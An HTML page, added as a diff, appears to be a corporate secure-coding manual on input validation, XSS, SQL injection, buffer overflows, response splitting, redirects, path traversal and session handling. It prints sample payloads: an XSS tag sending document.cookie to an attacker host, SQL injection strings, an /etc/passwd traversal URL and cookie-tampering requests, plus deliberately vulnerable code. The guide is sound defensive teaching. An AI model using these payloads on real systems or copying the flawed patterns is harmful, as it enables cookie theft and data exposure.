@@ -1,0 +1,857 @@
+<div>
+
+  <p>The main security aspects in Data Validation are as follows:</p>
+
+  <ul style="margin:0pt;padding:0pt;list-style-type:disc;">
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Data Validation</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Cross Site Scripting</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">SQL Injection</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Buffer Overflow</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">HTTP Response Splitting</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">URL Redirection</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Application Misbehavior UCI</p>
+    </li>
+  </ul>
+
+  <ul style="margin:0pt;padding:0pt;list-style-type:disc;">
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Form Fields</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">URL Parameters</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">HTTP Headers</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Hidden Fields</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Cookie Values</p>
+    </li>
+  </ul>
+
+  <p>&nbsp;</p>
+
+  <p>Jakarta Commons Validator is an input validation component devised to validate user input information.</p>
+
+  <p>Check and validate the following aspects of the input field: Required, Mask, Range, Maxlength, Minlength, Datatype, Date, Credit card, Email.</p>
+
+  <p>&nbsp;</p>
+
+  <h2 align="left">Cross Site Scripting:</h2>
+
+  <p>If the user enters secure coding for the search keyword then the following benign HTML will be generated at the top of the results page:</p>
+
+  <p>You Searched For: Secure Coding</p>
+
+  <p>If instead the user enters a javascript say: &lt;script&gt;alert(“Hello”) &lt;/script&gt; as a keyword, then the following malicious HTML will be sent to the user’s browser. The result would be something as below: You Searched For: &lt;script&gt;alert(“Hello”) &lt;/script&gt;.</p>
+
+  <p>The ability to change form submission locations at runtimes (i.e., document.forms[0].action), or make outbound HTTP connections for the purpose of transmitting cookies (e.g., XMLHTTP and document.cookie).</p>
+
+  <p>To prevent XSS attacks, data validation must be performed, before input and redisplay (such as output), on all data originating from a source external to the application. This includes data from:</p>
+
+  <ul style="margin:0pt;padding:0pt;list-style-type:disc;">
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">The current user</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Other users</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">All data sources, such as databases and a local file system</p>
+    </li>
+  </ul>
+
+  <p>The most effective way to prevent XSS attacks is to HTML-encode all dangerous characters before displaying user input within the application pages. This procedure should be performed on all user input, even in the presence of upfront input validation.</p>
+
+  <p>In particular, the characters that should be encoded before output are as follows:</p>
+
+  <p><strong>“ ‘ : &lt; &gt; ; ( ) / { } @ &amp; +</strong></p>
+
+  <p><strong>Note</strong>: One of the most common input validation mistakes made for the purpose of preventing XSS is to use a “tag filter” to remove unnecessary “&lt;script&gt;” tags. The examples we’ve seen thus far all have used the “&lt;script&gt;” tag to execute the malicious script, but be careful of assuming this is always the case. Consider the following three XSS examples:</p>
+
+  <p><strong>&lt;IMG SRC=’http://www.attacker.com/cookie.asp?cookie=’ + document.cookie’ ”&gt;</strong></p>
+
+  <p><strong>&lt;p style=”left:expression(eval(‘alert(document.cookie) ’) ) ” &gt;\u003Cscript\u003E</strong></p>
+
+  <p><strong>&lt;SCRIPT&gt; &lt;% = userdata %&gt; &lt;/SCRIPT&gt;</strong></p>
+
+  <p>The main drawback to using tag filters is that many of the wide array of XSS exploit strategies available do not require the use of “&lt;script&gt;” tags.</p>
+
+  <p>&nbsp;</p>
+
+  <p><strong>//Redisplay search term for informational purposes]</strong></p>
+
+  <p><strong>Response.Write(“You Searched For: ” + Request.getParams(“keyword”));</strong></p>
+
+  <p><strong>//Query the database to retrieve results</strong></p>
+
+  <p>&nbsp;</p>
+
+  <h2 align="left">SQL Injection:</h2>
+
+  <p>Consider the following Query:</p>
+
+  <p><strong>SELECT firstname, lastname, ssn, email_address FROM users WHERE username = ‘Joe’</strong></p>
+
+  <p>In the above query the username is being automatically populated from the user request. Now if, however, the attacker uses a name containing an apostrophe (like O’Conner), he receives an error message similar to the following:</p>
+
+  <p><strong>Joe’ OR ‘1’ = ‘1</strong></p>
+
+  <p>And considering the loop hole the following malicious statement is built:</p>
+
+  <p><strong>SELECT firstname, lastname, ssn, email_address FROM users WHERE username = ‘Joe’ OR ‘1’ = ‘1</strong></p>
+
+  <p>Hence, the use of the string building or concatenation to create dynamic SQL statements should be avoided to prevent SQL injection attacks.</p>
+
+  <p>As a result of this formatting, the exploit had to strategically use the injected single quotes to create a syntactically valid SL statement. In our SQL statement using the “acctnum” parameter, the user-supplied value is not delimited using strings. To perfrom an injection on this query, an attacker can simply append arbitrary SQL statements to the end of the “acctnum” input.</p>
+
+  <p>If the user enters 1234%20OR%201=1 in the “acctnum” parameter, the following malicious statement is constructed:</p>
+
+  <p><strong>SELECT cc_num, cc_exp FROM credit_cards WHERE acctnum = 1234 OR 1=1</strong></p>
+
+  <p>The first line of defense is to perform validation using the known Good Validation for all input used in SQL queries. If the Data is zip code then validation should be performed to verify that the data contains only numbers and has exact five digits.</p>
+
+  <p>The second step in the process is to implement parameterized queries such as PreparedStatement and CallableStatement interfaces (J2EE)</p>
+
+  <p>The third step in the defense against SQL injection is to centralize all the database access into stored procedures. Stored procedures allow the database permissions to be restricted to execute privileges on only the relevant stored procedures.</p>
+
+  <p>Sample SQL Injection Examples:</p>
+
+  <p><strong>String sql = “SELECT fname, lname, ssn, email_address FROM users WHERE username= ‘ ” + Request.getParams(“username”) + “ ‘ ” ;</strong></p>
+
+  <p><strong>Steing acctnum = Request.getParams(“acctnum”); String sql = “SELECT cc_num, cc_exp FROM credit_cards WHERE acctnum = ” + validateData(acctnum);</strong></p>
+
+  <p><strong>String sql = “UPDATE EMPLOYEES SET SALARY = ” + request.getParameter(“newSalary”) + “WHERE ID = ” + request.getParameter(“id”);</strong></p>
+
+  <p>&nbsp;</p>
+
+  <h2 align="left">Buffer Overflows:</h2>
+
+  <p>The main cause for all Buffer overflows is the failure to validate the length of user-supplied input.</p>
+
+  <p>Consider the Memory Structure:</p>
+
+  <p><img src="/content/articles/core/images/progsecurity_files/citi-security-manual-9.png" width="440" height="313" alt="[image]"></p>
+
+  <p><img src="/content/articles/core/images/progsecurity_files/citi-security-manual-1.jpg" width="376" height="432" alt="[image]"></p>
+
+  <p>The main cause for all Buffer overflows is the failure to validate the length of user-supplied input.</p>
+
+  <p>Env/Args -</p>
+
+  <p>Used for environmental and command line data</p>
+
+  <p>Stack – (run-time stack) the stack’s primary purpose is to make the use of functions more efficient. The stack consists of logical frames that are created when calling a function and removed when returning. A stack frame contains the parameters to a function, its logical variables, and the data necessary to recover the previous stack frame. This section operates as a traditional LIFO (last-in-first-out) queue, and it grows downwards such that the top of stack is toward the bottom of the memory.</p>
+
+  <p>Heap – Used for data that is dynamically allocated during run-time by the process (e.g., malloc). This structure grows upward toward higher memory addresses.</p>
+
+  <p>Data – This segment is read-only; it is used for storing fixed-size static data (e.g., static and final global variables).</p>
+
+  <p>Code – This segement is also read-only; it contains the program instructions from the executable file.</p>
+
+  <p>When a function must be interrupted, the following actions are carried out in order:</p>
+
+  <ol style="margin:0pt;padding:0pt;">
+    <li style="font-family:'Calibri';font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Place the function’s arguments on the stack (argv[1])</p>
+    </li>
+
+    <li style="font-family:'Calibri';font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Store the return address (RET) on the stack. The return address is the location at which to continue execution when StorePassword has exited. In this example, the address of the printf(“Password Stored”); instruction will be stored.</p>
+    </li>
+
+    <li style="font-family:'Calibri';font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Store the base pointer (EBP) on the stack. The EBP value is used for calculating the addresses of instructions in the main function once we return to it.</p>
+    </li>
+
+    <li style="font-family:'Calibri';font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Finally, store the variables local to StorePassword on the stack, (passwd[])</p>
+    </li>
+  </ol>
+
+  <p>When a function must be interrupted, the following actions are carried out in order:</p>
+
+  <p><img src="/content/articles/core/images/progsecurity_files/citi-security-manual-8.png" width="473" height="282" alt="[image]"></p>
+
+  <p><img src="/content/articles/core/images/progsecurity_files/citi-security-manual-2.jpg" width="265" height="222" alt="[image]"></p>
+
+  <p>To prevent Buffer overflows, first step is to avoid using dangerous C functions such as follows:</p>
+
+  <p>strcpy(), strcat(), strncat(), sprintf(), vsprintf(), scanf(), fgets(), gets(), getchar(), getws(), memcpy(), memmove().</p>
+
+  <p>Further most dangerous functions have “safe” counterparts that accept a size parameter to control how much data is written to a buffer.</p>
+
+  <p>&nbsp;</p>
+
+  <h2 align="left">HTTP Response Splitting:</h2>
+
+  <p>The essence of HTTP response splitting is the attacker’s ability to send a single HTTP request that forces the web server to form an output stream, which is then interpreted by the trarget as to two HTTP responses instead of one response. The first response may be partially controlled by the attacker, but this is less important. The attacker controls the form of the second response from the HTTP status line to the last byte of the HTTP response body and typically takes the form of an “innocent” resource on the web server. By controlling the second response, the attacker tricks the target into believing that a particular resource on the web server (designated by the second request) is the server’s HTTP response (server content), while it is in fact some data that is captured by the attacker through the Web server.</p>
+
+  <p>HTTP response splitting is a type of attack that is similar in nature to cross site scripting.</p>
+
+  <p>In this case, the attacker is targeting local (client-based) and remote (proxy-based) caching devices. HTTP response splitting vulnerabilities occur when the application embeds un-validated user-supplied data inside the HTTP response headers that are returned to the client browsers. HTTP headers themselves are used to provide meta-information (e.g., set cookies, cacheability, redirection location) about the ensuing HTTP response. Allowing an attacker to control the content of HTTP headers that will ultimately be returned to the client browsers exposes the application to numerous types of cache poisoning attacks.</p>
+
+  <p>What causes this behavior? The answer lies in the HTTP specifications detailed in RFC 2616; from this we know that the HTTP protocol has defined the sequence “CR LF” (i.e., the newline) as the end-of-line marker for all protocol elements. If an attacker can control content that will be used in the headers, then he or she can inject CRLF sequences to generate syntactically valid HTTP protocol elements and alter the apparent behavior of the web server. In our example, the attacker has inserted data in the “URL” parameter that mimics the content of a second HTTP response containing the simple HTML page indicated by &lt;html&gt;Nothing&lt;/html&gt;</p>
+
+  <p>When evaluating the impact of an HTTP response splitting attack, it is helpful to visualize the attack scenario. In the diagram below, the attacker will stage his attack by making two HTTP requests in rapid succession. The two requests have these characteristics:</p>
+
+  <ul style="margin:0pt;padding:0pt;list-style-type:disc;">
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Request A contains the attacker’s HTTP response splitting exploit.</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Request B asks for legitimate content, such as index.html.</p>
+    </li>
+  </ul>
+
+  <p><img src="/content/articles/core/images/progsecurity_files/citi-security-manual-3.jpg" width="620" height="220" alt="[image]"></p>
+
+  <p>The Internet-facing Web cache receives these requests and forwards them along to the web server.</p>
+
+  <p>As we can see below, when the web server responds, things get interesting. The response stream corresponding to Request A is interpreted by Web Cache as two completely separate HTTP responses (shown as A1 and A2). The caching device will accept the first two HTTP responses available and pair them with its original two requests. The pairings will resemble the following:</p>
+
+  <ul style="margin:0pt;padding:0pt;list-style-type:disc;">
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Request A will be paired with Response A1.</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Request B will be paired with Response A2.</p>
+    </li>
+  </ul>
+
+  <p><img src="/content/articles/core/images/progsecurity_files/citi-security-manual-4.jpg" width="620" height="220" alt="[image]"></p>
+
+  <p><img src="/content/articles/core/images/progsecurity_files/citi-security-manual-5.jpg" width="620" height="168" alt="[image]"></p>
+
+  <p>Response B will be ignored because it does not correspond to a known request.</p>
+
+  <p>The attacker hence has successfully caused the Web caching device to improperly match the request/response pairs. Any user who subsequently requests the same content as request B (i.e., index.html) will be served with the “poisoned” cached result.</p>
+
+  <p><img src="/content/articles/core/images/progsecurity_files/citi-security-manual-6.jpg" width="620" height="283" alt="[image]"></p>
+
+  <p>The most restrictive input validation method possible should be used to avoid accepting unnecessary characters. Validation must be performed on any data that will be embedded into HTTP in case of:</p>
+
+  <ul style="margin:0pt;padding:0pt;list-style-type:disc;">
+    <li style="font-size:11pt;margin-left:37.75pt;">
+      <p class="List_Paragraph">Setting the Cookies</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:37.75pt;">
+      <p class="List_Paragraph">Redirection (HTTP 3xx)</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:37.75pt;">
+      <p class="List_Paragraph">Setting MIME types, content type, file size</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:37.75pt;">
+      <p class="List_Paragraph">Custom headers</p>
+    </li>
+  </ul>
+
+  <p>If the input will be dynamic, then the following validation should be performed at a minimum:</p>
+
+  <ul style="margin:0pt;padding:0pt;list-style-type:disc;">
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Remove carriage return (CR, ASCII code 13) and line feed (LF, ASCII code 10) characters from data embedded into the HTTP response headers.</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Input filters should avoid accepting non-ASCII characters</p>
+    </li>
+  </ul>
+
+  <p>Hence, the proper way to defend against HTTP response splitting attacks is to:</p>
+
+  <ul style="margin:0pt;padding:0pt;list-style-type:disc;">
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Limit your input by rejecting non-ASCII characters</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Further reject any CR and LF characters</p>
+    </li>
+  </ul>
+
+  <p>&nbsp;</p>
+
+  <h2 align="left">URL Redirection:</h2>
+
+  <p>URL Redirection is a technique of sending a URL through the request and redirecting the browser to the specified URL. The process can be used for malicious activities to redirect the user from legitimate website to a similar looking fraud website. Below is a simple example of URL redirection:</p>
+
+  <p><a href="http://www.website.com/updateBlance.aspx?targetURL=http://www.website.com/success.aspx" class="Hyperlink">http://www.website.com/updateBlance.aspx?targetURL=http://www.website.com/success.aspx</a></p>
+
+  <p>URL Redirection Sample Code:</p>
+
+  <p><strong>………….</strong></p>
+
+  <p><strong>If (currentBalance &gt;= 0) {</strong></p>
+
+  <p><strong>// account successfully updated, show success page</strong></p>
+
+  <p><strong>Response.Redirect( Request.Params[“targetURL”] );</strong></p>
+
+  <p><strong>}</strong></p>
+
+  <p><strong>………….</strong></p>
+
+  <p>&nbsp;</p>
+
+  <h2 align="left">Application Misbehavior:</h2>
+
+  <p>Fundamentally, web applications interact with their users by sending and receiving various types of parameters. These parameters can represent any piece of mutable data within the application including the user’s name, bank account number, privilege level, or search keywords. When the parameters used to hold user controllable data are not properly validated, the application is at risk to attack via parameter manipulation resulting in a wide range of misbehaviors.</p>
+
+  <p>One of the most prominent points to grasp is that user controllable data can come from many different locations:</p>
+
+  <ul style="margin:0pt;padding:0pt;list-style-type:circle;">
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">HTTP cookies</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Hidden HTML form fields</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Query strings in HTTP GET requests</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Data in HTTP POST request</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">HTTP headers</p>
+    </li>
+  </ul>
+
+  <p>Any information passed to the Web Browser via one of the methods listed above exposes that data to modification. If the application fails to properly validate the data upon return, attackers can execute various types of information gathering exploits to profile how the application operates.</p>
+
+  <p>The most effective defense against application misbehavior is to validate all assumptions about user-supplied data, including:</p>
+
+  <ul style="margin:0pt;padding:0pt;list-style-type:disc;">
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Type</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Format</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Length</p>
+    </li>
+  </ul>
+
+  <p>Sample malicious requests:</p>
+
+  <p><strong>GET /admin.aspx HTTP/1.0</strong></p>
+
+  <p><strong>User-Agent: Mozilla/4.0</strong></p>
+
+  <p><strong>Host:</strong> <a href="http://www.example.com" class="Hyperlink" style="font-weight:bold;">www.example.com</a></p>
+
+  <p><strong>Cookie:</strong> <strong><span style="color:#FF0000;">PRIV=;</span></strong> <strong>SESSIONID=2KDSU72H9GSA289</strong></p>
+
+  <p><strong>GET /admin.aspx HTTP/1.0</strong></p>
+
+  <p><strong>User-Agent: Mozilla/4.0</strong></p>
+
+  <p><strong>Host:</strong> <a href="http://www.example.com" class="Hyperlink" style="font-weight:bold;">www.example.com</a></p>
+
+  <p><strong>Cookie:</strong> <strong><span style="color:#FF0000;">PRIV=ADMIN;</span></strong> <strong>SESSIONID=2KDSU72H9GSA289</strong></p>
+
+  <p><strong>&nbsp;</strong></p>
+
+  <p><strong>GET /admin.aspx HTTP/1.0</strong></p>
+
+  <p><strong>User-Agent: Mozilla/4.0</strong></p>
+
+  <p><strong>Host:</strong> <a href="http://www.example.com" class="Hyperlink" style="font-weight:bold;">www.example.com</a></p>
+
+  <p><strong>Cookie:</strong> <strong><span style="color:#FF0000;">PRIV=5;</span></strong> <strong>SESSIONID=2KDSU72H9GSA289</strong></p>
+
+  <p><img src="/content/articles/core/images/progsecurity_files/citi-security-manual-7.jpg" width="625" height="266" alt="[image]"></p>
+
+  <h2 align="left">Forceful Browsing:</h2>
+
+  <p>Forceful browsing is a method of guessing a web page addresses by manipulating the URL line instead of clicking on a hyperlink. In case a report is generated in web folder dynamically on the fly, it can be accessed by an attacker using forceful browsing which does not require special skills or tools. The poor choice of temporary filename is as follows:</p>
+
+  <ul style="margin:0pt;padding:0pt;list-style-type:disc;">
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Incremental (100.pdf, 101.pdf, 102.pdf)</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Only user account number (000012345678.pdf, 542763153.pdf, etc.)</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Social Security Number (999-99-9999.pdf, etc.)</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Company + Report Name (Citigroup-expense-report.pdf etc.)</p>
+    </li>
+  </ul>
+
+  <p>With incremental temporary filename the attacker can simply predict the next files/reports present in the Web folder and try to access them. Also with the account number and social security the attacker can search for known SSN and account numbers or use trial and error to find matching reports which may be present. Also from proper report names helps the attacker to guess other probable report names such as from Citigroup-expense-report.pdf he can try Citigroup-accounts-report.pdf etc.</p>
+
+  <p>Assuming the remote computer is a Unix-like computer, the user list will be located in the /etc/passwd file. Also, since “/” is not a valid URL character, %2F will be translated back to “/” but will be sent as %2F on the URL. The following URL is formatted in a way as to fool the application into looking at the “passwd” file instead of the file requested:</p>
+
+  <p><a href="http://www.example.com/mgr.asp?action=viewfile&amp;file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd" class="Hyperlink">http://www.example.com/mgr.asp?action=viewfile&amp;file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd</a></p>
+
+  <p>To protect against such attack, the server must validate filenames are “safe” by searching for use of “..” or other substitutions.</p>
+
+  <p>Access controls will be very specific – or in fact, too specific in Windows esp – and where a file such as “Secret File.doc” may be locked from being accessed but the file “Secret~1.doc” will be approved.</p>
+
+  <p>Also by using the technique of “Path Truncation” were the actual path is substituted by a mapped short URL. Hence due to the shorter pathname the effort/time to guess where other information is located, given the evidence increases.</p>
+
+  <p>&nbsp;</p>
+
+  <h2 align="left">Session Control:</h2>
+
+  <p>Displaying the session information in a URL is not considered professional and is considered a high risk. Such session information can be accessed or traced by the attacker and used to login or get customer information. The programmer must try to display the least amount of information as possible in the URL line while minimizing the amount of sensitive information stored at the browser. Remember borwser’s can be compromised by various attacks such as cross site scripting and transferring browser data to remote machine.</p>
+
+  <p><strong>Set-cookie: sessionid=1231241241451343242; expires=Thursday, 10-AUG-2006 12:32:58 GMT</strong></p>
+
+  <p>Cookies should never be used as a method for timing out sessions unless this “in addition to” one of the other techniques used to time out sessions.</p>
+
+  <p>&nbsp;</p>
+
+  <p><strong>Session ID:</strong></p>
+
+  <p>The following variables must never be passed by a form or through the URL unless through a secure channel such as HTTPS:</p>
+
+  <ul style="margin:0pt;padding:0pt;list-style-type:disc;">
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">User Name</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">User ID</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">User Contact Information</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Password</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Account Number (Unique ID Number)</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Computer Name</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Server Name</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">IP Addresses</p>
+    </li>
+  </ul>
+
+  <p>The Server should not trust the information delivered by the browser without verifying its authenticity. Likewise, storing information such as passwords, credit card numbers, social security numbers and other highly sensitive information should never be done using cookies. These are easy targets for gathering information.</p>
+
+  <p>A stronger system can often be created by limiting the session ID to association with only one IP address. However, many firewalls currently divide communications among multiple databases.</p>
+
+  <p>Session ID should always be a large random number which is harder to predict. While picking a random number, consider these sources for a seed:</p>
+
+  <ul style="margin:0pt;padding:0pt;list-style-type:disc;">
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Time and Date</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Hard drive space</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Packets sent by the server</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Total transaction by the database</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Previous random number</p>
+    </li>
+  </ul>
+
+  <p>The following can be easily forged:</p>
+
+  <ul style="margin:0pt;padding:0pt;list-style-type:disc;">
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Browser ID</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">URL</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Cookies</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">Acceptable communications (MIME-types, compression, encryptions)</p>
+    </li>
+  </ul>
+
+  <p>Information that cannot be guaranteed accurate when establishing a session:</p>
+
+  <ul style="margin:0pt;padding:0pt;list-style-type:disc;">
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">User has a single IP address</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph">User has a domain name</p>
+    </li>
+  </ul>
+
+  <p>&nbsp;</p>
+
+  <p><strong>Cookies:</strong></p>
+
+  <p>Cookie is the information stored by the browser from the server primarily to maintain the state information. The cookie is sent to the server by the browser to indicate the client state to the server. The cookie is sent to the server in a raw form by the browser:</p>
+
+  <p>GET /changecompany.php?newcompany=ABC.%20Inc HTTP-COOKIE: myname=John Q. Public HTTP-COOKIE: organization=Acme, LLC. &lt;CR&gt;</p>
+
+  <p>The assumption is that there is an actual web browser communicating to the server is also not guaranteed as there could be a man in the middle attacks.</p>
+
+  <p>The following information should not be stored in a cookie and or trusted by the server:</p>
+
+  <ul style="margin:0pt;padding:0pt;list-style-type:disc;">
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph" style="text-align:justify;margin-left:0pt;">User Account Information</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph" style="text-align:justify;margin-left:0pt;">Access Persmissions</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph" style="text-align:justify;margin-left:0pt;">User Details (real name, email address, etc.)</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph" style="text-align:justify;margin-left:0pt;">IP Address</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph" style="text-align:justify;margin-left:0pt;">Access Time</p>
+    </li>
+  </ul>
+
+  <p>&nbsp;</p>
+
+  <p>Another common mistake is not making the same validation checks on information provided by cookies as on would on a URL.</p>
+
+  <p>&nbsp;</p>
+
+  <h2 align="left">Error Messages:</h2>
+
+  <p>Software error messages should be prevented from appearing to the end user. Error messages should never reveal:</p>
+
+  <ul style="margin:0pt;padding:0pt;list-style-type:disc;">
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph" style="text-align:justify;margin-left:0pt;">Validation of credentials error messages (failed logins)</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph" style="text-align:justify;margin-left:0pt;">Code execution error messages (such as java exceptions)</p>
+    </li>
+  </ul>
+
+  <p>&nbsp;</p>
+
+  <p>Right Way is :</p>
+
+  <p><strong>try { // Source Code is placed here ……….</strong></p>
+
+  <p><strong>}</strong></p>
+
+  <p><strong>catch (Exception unknownException) {</strong></p>
+
+  <p><strong>unknownException.printStackTrace(LogFile);</strong></p>
+
+  <p><strong>DisplayGeneralErrorMessage();</strong></p>
+
+  <p><strong>}</strong></p>
+
+  <p>General Message Like:</p>
+
+  <p>System unavailable, please try again later. Unable to process information, please check your submission and try again. We have encountered an error, please try again later. Any of these will give a basic understanding that a problem occurred but doesn’t state the specifics.</p>
+
+  <p>&nbsp;</p>
+
+  <h2 align="left">Debug Code:</h2>  
+
+  <p>“Debug code” is actually just additional symbols and references, such as line numbers and names of functions, objects, and variables. When a problem is detected or the program is interrupted while executing, the debugger will use the references stored in the class file to show the programmer where the problem is</p>
+
+  <p>ProgrAM XV132</p>
+
+  <p>There are several advantages of removing debug information before deploying the application in the production environment. They are:</p>
+
+  <ul style="margin:0pt;padding:0pt;list-style-type:disc;">
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph" style="text-align:justify;margin-left:0pt;">Faster code execution</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph" style="text-align:justify;margin-left:0pt;">Reverse engineering becomes more difficult</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph" style="text-align:justify;margin-left:0pt;">Reduction of size</p>
+    </li>
+  </ul>
+
+  <p><a href="http://msdn2.microsoft.com/en-us/library/ms242231.aspx" class="Hyperlink">Debugger Security</a> provides some recommendations for secure debugging.</p>
+  <p>Account harvesting is process of using the system to collect accounts of other users.</p>
+
+  <p>&nbsp;</p>
+
+  <h2 align="left">Cross-Frame Scripting:</h2>  
+
+  <p>Cross-Frame Scripting is a form of attack that takes place between frames on a multi-frame web page. Each frame is actually a unique HTML document that works independently of one another and each can have their own URL. In order to connect the events of the frames, it is possible to associate events in one frame to report to event handlers in a different frame.</p>
+
+  <p>Two types of collection techniques:</p>
+
+  <ul style="margin:0pt;padding:0pt;list-style-type:disc;">
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph" style="text-align:justify;margin-left:0pt;">View Pages</p>
+    </li>
+
+    <li style="font-size:11pt;margin-left:36pt;">
+      <p class="List_Paragraph" style="text-align:justify;margin-left:0pt;">Monitor Events</p>
+    </li>
+  </ul>
+
+  <p>Checking User-Agent: Attribute to determine if user is using a prohibited browser.</p>
+
+  <p>Quick research can be done using the Open Source vulnerability Database to find vulnerabilities that may affect any of these systems.</p>
+
+  <p>Because programs such as ‘lint’ or automatic vulnerability scanners don’t inspect comments, exposure from comments can be a concern.</p>
+
+  <p><strong>--------------------------------------------------------------------------------------------------------------------------------</strong></p>
+
+  <h2 align="left">REFERENCES</h2>
+
+  <p><strong>--------------------------------------------------------------------------------------------------------------------------------</strong></p>
+
+  <p><a href="http://en.wikipedia.org/wiki/Principle_of_least_privilege" class="Hyperlink" style="font-weight:bold;">Wikipedia: Principle of least Privilege</a></p>
+
+  <p><a href="http://en.wikipedia.org/wiki/Privilege_escalation" class="Hyperlink" style="font-weight:bold;">Wikipedia: Privilege escalation</a></p>
+
